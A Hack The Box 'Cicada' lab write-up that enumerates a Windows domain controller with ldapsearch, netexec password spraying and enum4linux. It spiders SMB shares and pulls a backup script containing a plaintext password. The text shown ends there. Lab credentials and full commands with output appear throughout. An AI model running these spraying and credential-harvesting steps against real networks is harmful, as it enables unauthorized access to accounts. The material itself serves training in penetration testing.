# Cicada HTB


# Enumeration


## Searching for information

```bash
ldapsearch -x -H ldap://10.10.11.35 -D '' -w '' -b 'DC=cicada,DC=htb'
```

## Password found

Cicada$M6Corpb*@Lp#nZp!8


Trying to enumerate the possible users

```bash
❯ netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success                                                                   
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                               
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                                       
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                                      
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                               
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                              
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8                                                
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                              
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                                

```



using enum4linux -a -u '' -p <ip address>

we found the credentials for david.orelious => aRt$Lp#7t*VQ!3


```bash
❯ nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares                                                                                               
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)        
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3                                                                     
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares                                                                                            
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark                                                                           
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------                                                                           
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin                                                                     
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share                                                                    
SMB         10.10.11.35     445    CICADA-DC        DEV             READ                                                                                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ                                                                                             
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC                                                                       
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share                                                               
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share                                                               
❯ nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --spider DEV --pattern .                                                                               
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)        
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3                                                                     
SMB         10.10.11.35     445    CICADA-DC        [*] Started spidering                                                                                            
SMB         10.10.11.35     445    CICADA-DC        [*] Spidering .                                                                                                  
SMB         10.10.11.35     445    CICADA-DC        //10.10.11.35/DEV/. [dir]                                                                                        
SMB         10.10.11.35     445    CICADA-DC        //10.10.11.35/DEV/.. [dir]                                                                                       
SMB         10.10.11.35     445    CICADA-DC        //10.10.11.35/DEV/Backup_script.ps1 [lastm:'2024-08-28 12:28' size:601]                                          
SMB         10.10.11.35     445    CICADA-DC        [*] Done spidering (Completed in 1.1775314807891846)                                                             
❯ nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --share DEV --get-file Backup_script.ps1 Backup_script.ps1                                             
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)        
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3                                                                     
SMB         10.10.11.35     445    CICADA-DC        [*] Copying "Backup_script.ps1" to "Backup_script.ps1"                                                           
SMB         10.10.11.35     445    CICADA-DC        [+] File "Backup_script.ps1" was downloaded to "Backup_script.ps1"                                               
❯ cat Backup_script.ps1 -l powershell                                                                                                                                
   1   │                                                                                                                                                             
   2   │ $sourceDirectory = "C:\smb"                                                                                                                                 
   3   │ $destinationDirectory = "D:\Backup"                                                                                                                         
   4   │                                                                                                                                                             
   5   │ $username = "emily.oscars"                                                                                                                                  
   6   │ $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force                                                                                   
   7   │ $credentials = New-Object System.Management.Automation.PSCredential($username, $password)                                                                   
   8   │ $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"                                                                                                             
   9   │ $backupFileName = "smb_backup_$dateStamp.zip"                                                                                                               
  10   │ $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName                                                                          
  11   │ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath                                                                                    
  12   │ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"                                                                           

```

